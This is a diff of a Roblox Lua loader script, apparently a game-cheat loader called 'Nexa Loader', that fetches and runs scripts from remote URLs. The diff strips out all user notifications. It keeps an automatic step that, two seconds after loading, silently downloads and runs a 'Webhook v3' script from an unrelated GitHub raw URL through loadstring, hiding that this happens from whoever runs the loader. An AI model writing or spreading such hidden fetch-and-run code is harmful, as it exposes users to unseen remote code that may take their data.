@@ -1,5 +1,3 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/deividcomsono/Obsidian/refs/heads/main/Library.lua"))()
-
 --[[ 
 
 ███╗   ██╗███████╗██╗  ██╗ █████╗  
@@ -52,17 +50,6 @@ for _, gameInfo in pairs(games) do
     end
 end
 
--- Fungsi Notify pakai Library
-local function Notify(title, description, time)
-    pcall(function()
-        Library:Notify({
-            Title = title or "Notification",
-            Description = description or "",
-            Time = time or 4,
-        })
-    end)
-end
-
 -- Jalankan script utama
 if scriptUrl then
     local success, err = pcall(function()
@@ -70,27 +57,18 @@ if scriptUrl then
     end)
 
     if success then
-        Notify("Nexa Loader", "Script loaded successfully!", 5)
-
-        -- ✅ Auto eksekusi Webhook V3
+        -- Auto eksekusi Webhook V3
         task.delay(2, function()
             local webhookUrl = "https://raw.githubusercontent.com/hdgsydgdgdy1233/Loaderlua/refs/heads/main/Webhook%20v3"
-            local ok, err2 = pcall(function()
+            pcall(function()
                 loadstring(game:HttpGet(webhookUrl))()
             end)
-            if ok then
-                Notify("Webhook", "Webhook v3 executed successfully!", 4)
-            else
-                Notify("Webhook", "Failed to execute Webhook v3:\n" .. tostring(err2), 6)
-            end
         end)
 
     else
-        Notify("Nexa Loader", "Failed to load script:\n" .. tostring(err), 8)
         warn("Failed to load script:", err)
     end
 else
-    Notify("Nexa Loader", "Unsupported game (PlaceId: " .. tostring(placeId) .. ")", 6)
     warn("Unsupported game. PlaceId:", placeId)
 end
 
